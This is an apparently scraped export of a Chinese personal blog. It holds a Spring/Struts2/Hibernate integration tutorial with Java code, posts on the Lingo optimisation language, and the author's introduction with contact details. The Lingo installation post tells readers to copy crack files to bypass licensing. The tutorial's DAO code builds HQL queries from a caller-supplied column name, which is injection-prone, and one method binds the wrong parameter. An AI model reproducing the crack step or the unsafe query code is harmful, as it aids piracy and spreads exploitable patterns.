2. 编写src代码用于本次测试2.1 生成News.java的POJO类我们利用Annotation的注解方式完成： windows -&gt; perspetive -&gt; open perspective -&gt; database explore -&gt; 右键mysql -&gt; 连接 找到要处理的表 -&gt; 右键Hibernate reverse -&gt; src为项目的src路径，java package一般为com.tianxingjian.pojo -&gt; √create pojo -&gt; 点击add Hibernate mapping annotations to pojo -&gt; next -&gt; id generator -&gt; native -&gt; next -&gt; 点击表然后native -&gt; finish，生成pojo的时候最好把create abstract class取消掉，生成之后为了便于之后的JUnit测试加上toString方法，完整的News.java代码如下：上述操作完成之后pojo类的映射操作将自动保存在hibernate.cfg.xml文件中，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889package com.tianxingjian.pojo;import java.util.Date;import javax.persistence.Column;import javax.persistence.Entity;import javax.persistence.GeneratedValue;import javax.persistence.Id;import javax.persistence.Table;import javax.persistence.Temporal;import javax.persistence.TemporalType;/** * News entity. @author MyEclipse Persistence Tools */@Entity@Table(name = \"news\", catalog = \"news_db\")public class News implements java.io.Serializable &#123; // Fields private Integer nid; private String title; private Date date; private String content; // Constructors /** default constructor */ public News() &#123; &#125; /** full constructor */ public News(String title, Date date, String content) &#123; this.title = title; this.date = date; this.content = content; &#125; // Property accessors @Id @GeneratedValue @Column(name = \"nid\", unique = true, nullable = false) public Integer getNid() &#123; return this.nid; &#125; public void setNid(Integer nid) &#123; this.nid = nid; &#125; @Column(name = \"title\", length = 100) public String getTitle() &#123; return this.title; &#125; public void setTitle(String title) &#123; this.title = title; &#125; @Temporal(TemporalType.DATE) @Column(name = \"date\", length = 10) public Date getDate() &#123; return this.date; &#125; public void setDate(Date date) &#123; this.date = date; &#125; @Column(name = \"content\", length = 100) public String getContent() &#123; return this.content; &#125; public void setContent(String content) &#123; this.content = content; &#125; @Override public String toString() &#123; return \"News [nid=\" + nid + \", title=\" + title + \", date=\" + date + \", content=\" + content + \"]\\n\"; &#125;&#125; 1&lt;mapping class=\"com.tianxingjian.pojo.News\" /&gt; 2.2 定义INewsDAO.java接口123456789101112131415package com.tianxingjian.dao;import java.util.List;import java.util.Set;import com.tianxingjian.pojo.News;public interface INewsDAO &#123; public boolean doCreate(News vo) throws Exception; public boolean doUpdate(News vo) throws Exception; public News getElementById(Integer id) throws Exception; public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception; public List&lt;News&gt; findAll() throws Exception; public List&lt;News&gt; findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception; public Integer getAllCount(String column, String keyWord) throws Exception;&#125; 2.2 实现NewsDAOImpl.java类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879package com.tianxingjian.dao.impl;import java.util.Iterator;import java.util.List;import java.util.Set;import javax.annotation.Resource;import org.hibernate.Criteria;import org.hibernate.Query;import org.hibernate.SessionFactory;import org.springframework.stereotype.Component;import com.tianxingjian.dao.INewsDAO;import com.tianxingjian.pojo.News;@Componentpublic class NewsDAOImpl implements INewsDAO &#123; @Resource private SessionFactory sessionFactory; @Override public boolean doCreate(News vo) throws Exception &#123; return sessionFactory.getCurrentSession().save(vo) != null; &#125; @Override public boolean doUpdate(News vo) throws Exception &#123; String hql = \"update News set title=?, date=?, content=? where nid=?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, vo.getTitle()); query.setParameter(1, vo.getDate()); query.setParameter(2, vo.getContent()); query.setParameter(3, vo.getNid()); return query.executeUpdate() &gt; 0; &#125; @Override public News getElementById(Integer id) throws Exception &#123; return (News) this.sessionFactory.getCurrentSession().get(News.class, id); &#125; @Override public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception &#123; StringBuffer buffer = new StringBuffer(); buffer.append(\"delete from News where nid in (\"); Iterator&lt;Integer&gt; iterator = ids.iterator(); while (iterator.hasNext()) &#123; buffer.append(iterator.next()).append(\",\"); &#125; buffer.delete(buffer.length()-1, buffer.length()).append(\")\"); Query query = this.sessionFactory.getCurrentSession().createQuery(buffer.toString()); return query.executeUpdate() &gt; 0; &#125; @SuppressWarnings(\"unchecked\") @Override public List&lt;News&gt; findAll() throws Exception &#123; Criteria criteria = this.sessionFactory.getCurrentSession().createCriteria(News.class); return criteria.list(); &#125; @SuppressWarnings(\"unchecked\") @Override public List&lt;News&gt; findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception &#123; String hql = \"from News as n where n.\" + column + \" like ?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, \"%\" + keyWord + \"%\"); query.setFirstResult((currentPage-1)*lineSize); query.setMaxResults(lineSize); return query.list(); &#125; @Override public Integer getAllCount(String column, String keyWord) throws Exception &#123; String hql = \"select count(*) from News as n where n.\" + column + \" like ?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, \"%\" + column + \"%\"); Long count = (Long) query.uniqueResult(); return count.intValue(); &#125;&#125; 2.3 定义业务层INewsService.java接口12345678910111213141516package com.tianxingjian.service;import java.util.List;import java.util.Map;import java.util.Set;import com.tianxingjian.pojo.News;public interface INewsService &#123; public boolean insert(News vo) throws Exception; public boolean update(News vo) throws Exception; public News get(Integer id) throws Exception; public boolean delete(Set&lt;Integer&gt; ids) throws Exception; public List&lt;News&gt; list() throws Exception; public Map&lt;String, Object&gt; list(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception;&#125; 2.4 编写测试程序，用JUnit 点击IServiceImpl 点击MyEclipse右上角的New图标 查询Junit Test Case 将package改为com.tianxingjian.test -&gt; next 全选 -&gt; finish 使用JUnit进行单个方法的测试： 选中需要测试的类 把类进行展开 把C进行展开 就可以看到测试类中所有的方法 点击所需要运行的测试方法然后右键junit运行就行了 _注意: 在写hql语句的时候表名应该大写表示对象而不是小写，如下所示_ 12String hql = \"update News set title=?,date=?,content=? where nid=?\"; // 正确String hql = \"update news set title=?,date=?,content=? where nid=?\"; // 错误 完整JUnit测试代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798package com.tianxingjian.test;import static org.junit.Assert.*;import java.util.Date;import java.util.HashSet;import java.util.Set;import org.junit.Test;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;import org.springframework.stereotype.Service;import com.tianxingjian.pojo.News;import com.tianxingjian.service.INewsService;import junit.framework.TestCase;public class INewsServiceTest &#123; public static ApplicationContext ctx; static &#123; ctx = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); &#125; @Test public void testInsert() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); News vo = new News(); vo.setTitle(\"SSH整合了-\" + System.currentTimeMillis()); vo.setDate(new Date()); vo.setContent(\"SSH内容很丰富！\"); try &#123; TestCase.assertEquals(service.insert(vo), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testUpdate() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); News vo = new News(); vo.setNid(5); vo.setTitle(\"准备开始学习了！\"); vo.setDate(new Date()); vo.setContent(\"你高兴么！\"); try &#123; TestCase.assertEquals(service.update(vo), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testGet() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.get(1)); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; @Test public void testDelete() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); set.add(5); set.add(4); try &#123; TestCase.assertEquals(service.delete(set), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testList() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.list()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testListStringStringIntegerInteger() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.list(\"title\", \"\", 1, 3)); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;&#125; 3.将Spring和Struts2.x进行整合3.1 添加Struts2.x的支持 install Struts2.x facet -&gt; next -&gt; next -&gt; √ Spring Plugin -&gt; finish 3.2 为Spring添加监听器，即可在web中使用 监听器名称：org.springframework.web.context.ContextLoderListen 3.2.1 在web.xml文件中添加监听器（MyEclipse会自动添加）123&lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; 3.2.2 在web.xml文件中将applicationContext.xml里的配置设置到Web环境之中,将路径的信息设置为applicationContext.xml属性范围（MyEclipse会自动进行配置）1234&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt; &lt;/context-param&gt; 3.3 进行Struts的相关配置3.3.1 建立struts.properties文件，这个文件是用于设置对象工厂123struts.i18n.encoding=UTF-8struts.custom.i118n.resource=Messages,Pagesstruts.objectFactory=spring 3.1.2 修改struts.xml文件本次只是将SSH进行整合，所以只是简单的配置了name、namespace和extends，在实际开发中，需要在package里进行相关跳转路径的配置 123&lt;package name=\"root\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;/package&gt; 3.1.3 编写NewsAction.java程序，用于进行相关的业务操作NewsAction.java的完整代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687package com.tianxingjian.action;import java.util.HashSet;import java.util.Set;import javax.annotation.Resource;import org.apache.struts2.ServletActionContext;import org.apache.struts2.convention.annotation.Action;import org.apache.struts2.convention.annotation.Namespace;import org.apache.struts2.convention.annotation.ParentPackage;import org.springframework.stereotype.Repository;import com.opensymphony.xwork2.ActionSupport;import com.tianxingjian.pojo.News;import com.tianxingjian.service.INewsService;@Repository@ParentPackage(\"root\")@Namespace(\"/pages/news\")@Action(value=\"NewsAction\")@SuppressWarnings(\"serial\")public class NewsAction extends ActionSupport&#123; @Resource private INewsService newsService; private News news = new News(); public News getNews() &#123; return news; &#125; public void insert() &#123; System.out.println(\"【新闻数据增加】数据\" + this.news); try &#123; System.out.println(\"【新闻数据增加】业务调用结果\" + this.newsService.insert(this.news)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void update() &#123; System.out.println(\"【新闻数据修改】数据\" + this.news); try &#123; System.out.println(\"【新闻数据修改】业务调用结果\" + this.newsService.update(this.news)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void delete() &#123; String ids = ServletActionContext.getRequest().getParameter(\"ids\"); System.out.println(\"【新闻数据删除】数据\" + ids); try &#123; Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); String result [] = ids.split(\"_\"); for (int x=0; x&lt;result.length; x++) &#123; set.add(Integer.parseInt(result[x])); &#125; System.out.println(\"【新闻数据删除】业务调用结果\" + this.newsService.delete(set)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void get() &#123; System.out.println(\"【新闻数据取得】数据\" + this.news); try &#123; System.out.println(\"【新闻数据取得】业务调用结果：\" + this.newsService.get(this.news.getNid())); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void list() &#123; System.out.println(\"【新闻数据查询】数据\" + this.news); try &#123; System.out.println(\"【新闻数据查询】业务调用结果：\" + this.newsService.list()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void listSplit() &#123; System.out.println(\"【新闻数据查询】数据\" + this.news); try &#123; System.out.println(\"【新闻数据查询】业务调用结果：\" + this.newsService.list(\"title\", \"\", 1, 3)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 3.1.4 启动Tomcat并进行测试（测试时在地址上进行传参） 启动Tomcat 访问地址： 添加地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!insert.action?news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！“ 更新地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!update.action?news.nid=5&amp;news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！“ 删除地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!delete.action?ids=&quot;6_7“ 查询全部：http://localhost:8080/SSHDemo/pages/news/NewsAction!list.action 分页查询：http://localhost:8080/SSHDemo/pages/news/NewsAction!listSplit.action 根据id查询：http://localhost:8080/SSHDemo/pages/news/NewsAction!get.action?news.nid=6 _在运行的时候有可能会出现以下几个错误：_ java.lang.NoSuchMethodError:antlr.collections.AST.getLine()_**解决方案：这个错误的产生原因是Hibernate和Struts中都存在antrl的文件，只需要将低版本的jar文件进行移除就可以了。操作：window -&gt; preference -&gt; lib -&gt; struts2.1 -&gt; core -&gt; 取消antrl的jar文件 -&gt; apply -&gt; 出来后重新刷新如果依然有错就将strutss2进行remove build path然后重新添加 Caused by: java.lang.ClassNotFoundException: com.mchange.v2.ser.Indirector解决方案：在官网下载一个mchange-commons-java的jar文件，然后build path并添加到lib中，这样就能配置到项目中了，错误也就消失了，想这种错误都是缺少jar包，只需要下载并配置即可解决 4. HibernateDaoSupport支持类 以上实现的SSH整合是在Spring3.x被迫形成的，因为从最早的Spring2和现在的Spring4都会提供一个HibernateDaoSupport类，利用这个类结合HibernateTemplate操作模板就可以轻松地实现，HibernateDaoSupport类里面提供的一系列的操作方法还可以简化Hibernate的编写难度。 在org.springframework.orm.hibernate4.support.HibernateDaoSupport里提供有如下方法： |- 构造方法：public HibernateDaoSupport(); |- 设置Hibernate操作模板：public final void setHibernateTemplate(HibernateTemplate hibernateTemplate); |- 取得Hibernate操作模板：public final HibernateTemplate getHibernateTemplate(); 如果要想使用这个操作则需要清楚HibernateTemplate的定义，有如下一些方法： |- 构造方法：public HibernateTemplate(); |- 设置SessionFactory：public void setSessionFactory(SessionFactory sessionFactory); 同时在HibernateTemplate中提供有一些列的简化Hibernate操作的方法。 4.1 利用HibernateDaoSupport实现操作4.1.1 修改applicationContext.xml文件123&lt;bean id=\"hibernateTemplate\" class=\"org.springframework.orm.hibernate4.HibernateTemplate\"&gt; &lt;property name=\"sessionFactory\" ref=\"sessionFactory\"/&gt;&lt;/bean&gt; 4.1.2 定义NewsDaoImpl子类的时候使用这个操作 extends HibernateDaoSupport 不再使用SessionFactory，而是使用HibernateTemplate 1234567@Autowired public NewsDAOImpl(HibernateTemplate ht) &#123; super.setHibernateTemplate(ht); &#125; // @Resource// private SessionFactory sessionFactory; 然后将处理方法中的this.sessionFactory改为super.getHibernateTemplate…… 更改后的NewsDaoImpl.java类如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596package com.tianxingjian.dao.impl;import java.util.Iterator;import java.util.List;import java.util.Set;import org.hibernate.Query;import org.hibernate.criterion.DetachedCriteria;import org.hibernate.criterion.Restrictions;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.orm.hibernate4.HibernateTemplate;import org.springframework.orm.hibernate4.support.HibernateDaoSupport;import org.springframework.stereotype.Component;import com.tianxingjian.dao.INewsDAO;import com.tianxingjian.pojo.News;@Componentpublic class NewsDAOImpl extends HibernateDaoSupport implements INewsDAO &#123; @Autowired public NewsDAOImpl(HibernateTemplate ht) &#123; super.setHibernateTemplate(ht); &#125; // @Resource// private SessionFactory sessionFactory; @Override public boolean doCreate(News vo) throws Exception &#123; return super.getHibernateTemplate().save(vo) != null;// return sessionFactory.getCurrentSession().save(vo) != null; &#125; @Override public boolean doUpdate(News vo) throws Exception &#123; String hql = \"update News set title=?, date=?, content=? where nid=?\";// Query query = super.getHibernateTemplate().createQuery(hql); Query query = super.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(hql); query.setParameter(0, vo.getTitle()); query.setParameter(1, vo.getDate()); query.setParameter(2, vo.getContent()); query.setParameter(3, vo.getNid()); return query.executeUpdate() &gt; 0; &#125; @Override public News getElementById(Integer id) throws Exception &#123; return super.getHibernateTemplate().get(News.class, id);// return (News) this.sessionFactory.getCurrentSession().get(News.class, id); &#125; @Override public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception &#123; StringBuffer buffer = new StringBuffer(); buffer.append(\"delete from News where nid in (\"); Iterator&lt;Integer&gt; iterator = ids.iterator(); while (iterator.hasNext()) &#123; buffer.append(iterator.next()).append(\",\"); &#125; buffer.delete(buffer.length()-1, buffer.length()).append(\")\"); Query query = super.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(buffer.toString());// Query query = this.sessionFactory.getCurrentSession().createQuery(buffer.toString()); return query.executeUpdate() &gt; 0; &#125; @SuppressWarnings(\"unchecked\") @Override public List findAll() throws Exception &#123; DetachedCriteria dc = DetachedCriteria.forClass(News.class); return super.getHibernateTemplate().findByCriteria(dc);// Criteria criteria = this.sessionFactory.getCurrentSession().createCriteria(News.class);// return criteria.list(); &#125; @SuppressWarnings(\"unchecked\") @Override public List findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception &#123; DetachedCriteria dc = DetachedCriteria.forClass(News.class); dc.add(Restrictions.ilike(column, \"%\" + keyWord + \"%\")); return super.getHibernateTemplate().findByCriteria(dc, (currentPage-1)*lineSize, lineSize);// String hql = \"from News as n where n.\" + column + \" like ?\";// Query query = this.sessionFactory.getCurrentSession().createQuery(hql);// query.setParameter(0, \"%\" + keyWord + \"%\");// query.setFirstResult((currentPage-1)*lineSize);// query.setMaxResults(lineSize);// return query.list(); &#125; @Override public Integer getAllCount(String column, String keyWord) throws Exception &#123; String hql = \"select count(*) from News as n where n.\" + column + \" like ?\"; Long count = (Long) super.getHibernateTemplate().find(hql, \"%\" + keyWord + \"%\").get(0);// Query query = this.sessionFactory.getCurrentSession().createQuery(hql);// query.setParameter(0, \"%\" + column + \"%\");// Long count = (Long) query.uniqueResult(); return count.intValue(); &#125;&#125; 4.2 HibernateDaoSupport使用总结 使用HibernateDaoSupport的时候感觉似乎也并没有简单什么， 以上是两种操作方式，分别是使用SessionFactory和HibernateDaoSupport，这两个种基本都差不多，即在实际开发中这两种方法可根据自己的喜好来使用。 5. 使用MyEclipse进行SSH项目整合总结 以上便是此次利用MyEclipse进行SSH项目整合总结，感觉今天的学习效率很低，一天下来只是学了这个部分的内容，而且并不是说今天之后就被完全吸收，在之后的学习过程中还是需要不断的进行反反复复的温习。 学习时间：2018-07-17","path":"2018/09/20/利用MyEclipse进行SSH项目整合/"},{"title":"Lingo解决优化问题","text":"前言前面，我们已经对Lingo有了一定的了解，但是要想真正的熟悉Lingo在解决优化问题中的强大之处，还需要不断加强相关训练，本文主要是使用Lingo来解决优化问题，该文的主要目的有以下三点： 希望能够提升自己对Lingo的相关操作并加强对优化问题的思维模式 方便日后对Lingo核心操作的回顾 希望每一位到来的朋友能够有所收获 若您对Lingo的安装及基本操作不是很了解，可暂且移步：Lingo安装、Lingo基本操作 优化模型介绍优化模型主要有三个基本要素：决策变量、目标函数、约束条件。其一般形式如下： opt \\ \\ \\ \\ f(x) \\\\ s.t \\ \\ \\ \\ h_i(x)=0,\\ i=1,2,\\cdots,m \\\\ g_j(x)\\leq0,\\ j=1,2,\\cdots,l$opt$ 是“optimize”的缩写，表示“最优化”，一般为 $min$ 或 $max$，$f(x)$ 表示目标函数，$s.t.$ 是“subject to”的缩写“受约束于”，$h_i(x), g_i(x)$ 则表示约束条件，其中 $x$ 表示优化模型的决策变量。 运输问题问题描述 Question：有三个生产地和四个销售地，其生产量、销售量及单位运费如表所示，求总运费最少的运输方案以及总运费。 问题分析由题意，我们不难看出优化模型的决策变量是每个生产地向各个销售地运输的货量，即 $s_{ij}$。运输的总费用由各个产地向各个销售地运输所需费用之和，一个产地可以向多个销售地运输货物，一个销售地亦可接受多个产地的货物，所以可知优化模型中的目标函数是运输的总费用，即 $W=\\sum^3_{i=1}\\sum^4_{j=1}s_{ij}x_{ij}$。除此之外，该目标函数受到两个限制，即优化模型的约束条件： 生产地限制：每个生产地的运输量理应小于产生量，$\\sum_{j=1}^4s_{ij}\\leq a_i$ 销售地限制：每个销售地接受的货物理应等于销售量，$\\sum_{i=1}^3x_{ij}=b_j$ 优化模型构建有以上问题分析，为求出总运费最小的方案，我们可以构建该问题的优化模型如下： min \\ \\ \\ \\ \\sum^3_{i=1}\\sum^4_{j=1}s_{ij}x_{ij} \\\\ s.t. \\ \\ \\ \\ \\sum_{j=1}^4s_{ij}\\leq a_i \\;;\\ \\sum_{i=1}^3x_{ij}=b_j \\ ;\\ s_{ij}\\geq0 \\ ;模型求解求解的Lingo代码如下： 1234567891011121314151617sets:supply/1..3/: a;demand/1..4/: b;link(supply, demand): c, x;endsetsdata:a = 30,25,21;b = 15,17,22,12;c = 6,2,6,7, 4,9,5,3, 8,8,1,5;enddatamin = @sum(link(i,j): c(i,j) * x(i,j));@for(supply(i): @sum(demand(j): x(i,j)) &lt;= a(i));@for(demand(j): @sum(supply(i): x(i,j)) = b(j)); 求解结果运行如上所示Lingo程序，我们可以得到如下结果： 通过上图展示，我们可以得到运输的最佳方案以及最小运费161个单位。运输方案图示如下： 待续","path":"2018/09/14/Lingo解决优化问题/"},{"title":"Lingo基本操作","text":"前言Lingo是一门主要求解非线性规划数学模型的编程软件，记得最初接触Lingo是在阅读《数学建模教程》一书，该书在第五章主要讲解使用Lingo来解决优化问题，也是在那个时候认识到了Lingo的强大之处。Lingo的使用就好比解决一道简单的数学问题，而你只需要使用Lingo支持的编程规范给其提供充足的已知条件即可，之后会自动使用相关算法为您解答。为了日后更加方便的查询Lingo相关知识，所以将Lingo的基本使用在此记录。 关于Lingo的下载及安装问题鄙人已做整理，可参考本篇教程 Lingo安装 Lingo基本运算符算术运算符^：乘方*：乘/：除+：加-：减 逻辑运算符在Lingo中，逻辑运算符主要用于集循环函数的条件表达式中，来控制在函数中哪些集成员被包含，哪些被排斥。 符号 说明 #and# 且，&amp; #or# 或，\\ \\ #not# 非，! #eq# 等于，== #ne# 不等于，!= #gt# 大于，&gt; #ge# 大于等于，&gt;= #lt# 小于，&lt; #le# 小于等于，&lt;= 关系运算符= 、&lt;= 、 &gt;= 函数标准数学函数 函数 说明 @abs(x) 绝对值 @sin(x) 正弦值，采用弧度制 @cos(x) 余弦值 @tan(x) 正切 @exp(x) 指数，$e^x$ @log(x) 自然对数 @lgm(x) gamma函数的自然对数 @sign(x) x&lt;0返回-1，否则返回返回1 @floor(x) 取整 @smax($x_1,x_2,\\cdots,x_n$) 取($x_1,x_2,\\cdots,x_n$) 中的最大值 @smin($x_1,x_2,\\cdots,x_n$) 取($x_1,x_2,\\cdots,x_n$) 中的最小值 集循环函数集循环函数用于遍历整个集，其基本语法如下： 12@function(setname[(set_index_list)[|conditional_qualifier]]:expression_list); @function相应于下面罗列的四个集循环函数之一；setname是要遍历的集；set_ index_list是集索引列表；conditional_qualifier是用来限制集循环函数的范围，当集循环函数遍历集的每个成员时，LINGO都要对conditional_qualifier进行评价，若结果为真，则对该成员执行@function操作，否则跳过，继续执行下一次循环。expression_list是被应用到每个集成员的表达式列表，当用的是@for函数时，expression_list可以包含多个表达式，其间用逗号隔开。这些表达式将被作为约束加到模型中。当使用其余的三个集循环函数时，expression_list只能有一个表达式。如果省略set_index_list，那么在expression_list中引用的所有属性的类型都是setname集。 @for@for函数用来对集中的成员形成约束。 例：产生序列[1,4,9,16,25] 12345sets:nums/1..5/: x;endsets@for(nums(i): x(i)=i^2); @sum@sum函数返回遍历指定集成员的一个表达式的和 例：求[1,2,3,4,5,6,7]中前五个数的和 1234567sets:nums/1..7/: x;endsets@for(nums(i): x(i)=i);s = @sum(nums(i) | i #le# 5: x(i)); @max，@min这两个函数分别用于返回指定集成员的一个表达式的最大值和最小值 例：求[1,2,3,4,5,6,7,8,9,10]中前五个数的最大值，后五个数的最小值 12345678sets:nums/1..10/: x;endsets@for(nums(i): x(i)=i);min_value = @max(nums(i) | i #le# 5: x);max_value = @min(nums(i) | i #ge# 6: x); 变量界定函数该函数主要是对决策变量做附加限制，一般用于@for函数中，主要有如下四种： 函数 说明 @bin(x) 限制x为0或1 @bnd(a,x,b) 限制x取a到b之间的值 @free(x) x取实数 @gin(x) x取整数 说明 Lingo中还有其他大量的函数，比如金融函数、概率函数、变量界定函数，由于目前鄙人暂时用不上，所以就暂且不记录了，待需要时再做进一步更新。 待更新","path":"2018/09/14/Lingo基本操作/"},{"title":"Lingo安装","text":"Lingo简介&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LINGO是Linear Interactive and General Optimizer的缩写，即“交互式的线性和通用优化求解器”，由美国LINDO系统公司（Lindo System Inc.）推出的，可以用于求解非线性规划，也可以用于一些线性和非线性方程组的求解等，功能十分强大，是求解优化模型的最佳选择。其特色在于内置建模语言，提供十几个内部函数，可以允许决策变量是整数（即整数规划，包括 0-1 整数规划），方便灵活，而且执行速度非常快。能方便与EXCEL，数据库等其他软件交换数据。 Lingo安装 Lingo下载地址：点击我&nbsp;&nbsp;&nbsp;&nbsp;密码：r6cy 下载到本地并解压后可见以下文件 双击运行LINGO-WINDOWS-IA32-12.0.exe可执行文件 单击Next 单击I accept 并Next 更改安装目录，Next 点击Only For Me，出现后续窗口点击OK 取消Launch，并Finish 打开“lingo12破解文件”并复制所有文件粘贴至Lingo所在目录 安装完成 安装声明&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;提供的安装文件皆来自网络共享资源，若想更好的体验请支持正版,Lingo官网下载地址:点击我。如内容有侵犯您的版权或利益的请联系QQ：26647879,WX：LT510087153，鄙人见后会在第一时间进行处理。","path":"2018/09/13/Lingo安装/"},{"title":"Begin","text":"关于本站既然这是本站的第一篇博文，首先得说下这个博客搭建的初衷： 好记性不如烂笔头，何况我根本没有好记性。记忆力这种东西就像内存，你渴望接受的东西越多需要记忆的量也就越大，所以会频繁性的造成遗忘之前所学所想的现象。当你某一天需要的时候，可能又会支付较大的时间成本才能再次捡起。所以希望能在本站记录一些自己的学习过程，以便日后的再次回顾。 记得在自己学习的时候，总会出现各种各样的玄学bug，而此时首先想到的就是去biadu、google、Stack Overflow等一些知名网站去寻找解决方法。然而令人崩溃的是这些解答大同小异，使用之后依然不能解决问题，原本一个小小的问题却需要花费大量的时间。所以希望来访的朋友都能够有所收获，在较短的时间内解决看起来不是问题的问题。 感觉拥有一个自己的个人博客很Cool，能够在这“为所欲为、畅所欲言”，而不像csdn、博客园那样的有所拘束。 基于以上三点，所以就有了建站的想法。虽然之前花了将近20天使用Django、ssm后端框架 + 前端 + 各种插件来搭建过博客，但是为了避免备案、维护等困扰，所以最终选择了成熟的Hexo来实现。经过两天的坚持，最终本站才初见成色。 本站历程： 2018-09-05 使用Hexo+Next成功搭建个人博客系统的基本功能 (￣_,￣ ) 2018-09-10 添加鼠标点击出现爱心效果 o(*≧▽≦)ツ┏━┓ 2018-09-27 成功引入DaoVoice网页在线联系功能 ╰(°▽°)╯ 2018-10-10 在本站右下角添加Aplayer音乐系统 (ˉ▽￣～) 切~~ 关于我鄙人是江西上饶的一位无名小卒，现于上海一所双非大学本科在读，现实生活中比较内向、形单影只，但热衷于各种技术，正朝着极客的方向努力。 Contcat me： Email：26647978@qq.com QQ：26647879 VX：LT510087153","path":"2018/09/08/Begin/"}]}